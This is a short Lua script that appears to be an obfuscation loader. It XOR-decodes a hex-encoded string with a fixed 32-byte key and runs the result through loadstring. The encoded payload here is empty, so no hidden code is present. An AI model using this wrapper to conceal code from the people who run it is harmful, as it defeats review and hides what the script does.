local k={217,173,104,234,178,139,241,2,43,219,128,94,116,144,148,85,95,253,220,85,65,203,90,243,70,24,38,139,38,178,241,178}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
